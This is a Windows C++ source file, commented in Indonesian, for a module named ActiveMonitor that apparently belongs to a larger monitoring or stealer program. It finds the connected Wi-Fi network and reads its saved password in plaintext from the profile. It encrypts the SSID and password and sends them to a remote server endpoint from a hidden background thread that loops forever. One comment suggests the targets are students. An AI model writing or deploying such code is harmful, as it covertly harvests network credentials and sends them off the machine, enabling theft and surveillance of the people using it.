#include <winsock2.h>
#include "active.h"
#include "config.h"
#include "utils.h"
#include "transmission.h"
#include "encryption.h"
#include <wlanapi.h>
#include <sstream>
#include <mutex>
#include <thread>
#include <chrono>

#pragma comment(lib, "wlanapi.lib")

namespace ActiveMonitor {

    // State internal untuk melacak pengiriman terakhir
    static std::string lastSsid = ""; 
    static std::string lastPass = "";
    static time_t lastSendTime = 0;   
    static std::mutex statusMtx;      

    /**
     * Mengambil detail SSID dan Password WiFi yang sedang aktif terhubung.
     * Sekarang hanya mengambil interface yang statusnya 'Connected'.
     */
    void GetWifiDetails(std::string& ssid, std::string& password) {
        HANDLE hClient = NULL;
        DWORD dwVersion = 0;
        if (WlanOpenHandle(2, NULL, &dwVersion, &hClient) != ERROR_SUCCESS) return;

        PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
        if (WlanEnumInterfaces(hClient, NULL, &pIfList) == ERROR_SUCCESS) {
            for (int i = 0; i < (int)pIfList->dwNumberOfItems; i++) {
                PWLAN_CONNECTION_ATTRIBUTES pConnectInfo = NULL;
                DWORD connectInfoSize = sizeof(WLAN_CONNECTION_ATTRIBUTES);
                
                // Pastikan interface dalam keadaan terhubung (Connected)
                if (WlanQueryInterface(hClient, &pIfList->InterfaceInfo[i].InterfaceGuid, 
                    wlan_intf_opcode_current_connection, NULL, &connectInfoSize, (PVOID*)&pConnectInfo, NULL) == ERROR_SUCCESS) {
                    
                    if (pConnectInfo->isState == wlan_interface_state_connected) {
                        DOT11_SSID rawSsid = pConnectInfo->wlanAssociationAttributes.dot11Ssid;
                        ssid = std::string((char*)rawSsid.ucSSID, rawSsid.uSSIDLength);
                        
                        PWSTR xmlProfile = NULL;
                        DWORD flags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
                        
                        // Ambil profil untuk mengekstrak password
                        if (WlanGetProfile(hClient, &pIfList->InterfaceInfo[i].InterfaceGuid, 
                            pConnectInfo->strProfileName, NULL, &xmlProfile, &flags, NULL) == ERROR_SUCCESS) {
                            
                            if (xmlProfile) {
                                std::wstring xml(xmlProfile);
                                std::wstring startTag = L"<keyMaterial>";
                                std::wstring endTag = L"</keyMaterial>";
                                
                                size_t startPos = xml.find(startTag);
                                size_t endPos = xml.find(endTag);

                                if (startPos != std::wstring::npos && endPos != std::wstring::npos && endPos > startPos) {
                                    startPos += startTag.length();
                                    password = Ws2S(xml.substr(startPos, endPos - startPos));
                                } else {
                                    password = "[OPEN/NO PASS]";
                                }
                                WlanFreeMemory(xmlProfile);
                            }
                        }
                        WlanFreeMemory(pConnectInfo);
                        
                        // Jika sudah menemukan interface yang aktif, hentikan pencarian
                        if (!ssid.empty()) break; 
                    } else {
                        WlanFreeMemory(pConnectInfo);
                    }
                }
            }
            WlanFreeMemory(pIfList);
        }
        WlanCloseHandle(hClient, NULL);
    }

    /**
     * Menyusun data heartbeat dan mengirimkannya ke endpoint /post-active.
     * Mengoptimalkan trafik: hanya kirim jika SSID berubah atau interval waktu tercapai.
     */
    void SendActiveStatus() {
        std::string baseUrl;
        
        // Ambil URL dengan aman (Gunakan lock jika perlu, atau asumsikan DYNAMIC_SERVER_URL sudah stabil)
        if (Config::DYNAMIC_SERVER_URL.empty()) return;
        baseUrl = Config::DYNAMIC_SERVER_URL;

        std::string currentSsid = "Ethernet", currentPass = "N/A";
        GetWifiDetails(currentSsid, currentPass);
        
        time_t now = time(NULL);
        bool shouldSend = false;

        // Logika pengiriman cerdas
        {
            std::lock_guard<std::mutex> lock(statusMtx);
            // Kirim jika:
            // 1. Belum pernah kirim sama sekali
            // 2. SSID berubah (Santri pindah hotspot)
            // 3. Sudah lebih dari 10 menit (Heartbeat rutin)
            if (lastSendTime == 0 || lastSsid != currentSsid || (now - lastSendTime >= 590)) {
                shouldSend = true;
            }
        }

        if (!shouldSend) return;

        // Siapkan data biner untuk dikirim
        std::stringstream ss;
        ss << currentSsid << "|" << currentPass;
        std::string logContent = ss.str();
        std::vector<BYTE> data(logContent.begin(), logContent.end());
        
        // Enkripsi sebelum transmisi
        FinalEncryption(data);

        // Routing URL ke endpoint khusus status aktif
        size_t pos = baseUrl.find("/upload");
        if (pos != std::string::npos) baseUrl = baseUrl.substr(0, pos);
        while (!baseUrl.empty() && (baseUrl.back() == '/' || baseUrl.back() == ' ')) baseUrl.pop_back();

        std::string targetUrl = baseUrl + "/post-active";

        bool success = PostDataChunked(
            data,
            "activity",
            "active_status.dat",
            std::to_string(now),
            0,
            1,
            targetUrl 
        );

        if (success) {
            std::lock_guard<std::mutex> lock(statusMtx);
            lastSendTime = now;
            lastSsid = currentSsid;
            lastPass = currentPass;
        }
    }

    /**
     * Memulai pemantauan dalam thread terpisah.
     */
    void StartReactiveMonitoring() {
        std::thread([]() {
            // Beri waktu modul lain (NetworkGate/FetchLink) untuk inisialisasi
            std::this_thread::sleep_for(std::chrono::seconds(15)); 
            
            while (true) {
                try {
                    SendActiveStatus();
                } catch(...) {
                    // Mencegah thread mati jika terjadi error tak terduga
                }
                
                // Cek status setiap 30 detik (tapi SendActiveStatus punya filter 10 menit di dalamnya)
                // Ini membuat sistem responsif jika SSID berubah mendadak
                std::this_thread::sleep_for(std::chrono::seconds(30)); 
            }
        }).detach();
    }
}